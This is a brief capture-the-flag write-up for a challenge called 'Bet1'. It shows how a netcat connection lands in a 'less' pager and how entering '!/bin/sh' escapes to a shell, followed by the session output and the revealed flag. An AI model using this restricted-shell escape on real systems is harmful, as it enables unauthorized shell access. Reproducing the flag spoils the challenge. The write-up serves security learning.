
# Bet1
Upon connection to the server and typing in some random characters, you will get the output for the "less" help:

     SUMMARY OF LESS COMMANDS

      Commands marked with * may be preceded by a number, N.
      Notes in parentheses indicate the behavior if N is given.
      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.
      ...
This means that your netcat session is piped to an open `less` process on the other end. Getting to a shell from less is fairly easy, and is fairly common when you need to escape restrictive shells such as rbash. I recommend reading more about escaping from restrictive shells, it's pretty interesting to see how many binaries can open a shell.

To get to a shell, we can simply enter `!/bin/sh` upon connecting:

    root@beer:~/crypto# nc ctf.safebreach.com 31337
	!/bin/sh
	WARNING: terminal is not fully functional
	/bin/sh: can't access tty; job control turned off
	/pwn $ cat flag
	cat flag
	CTF{520e4e6dab8e5c3a1a6b61f6ef7e9352}

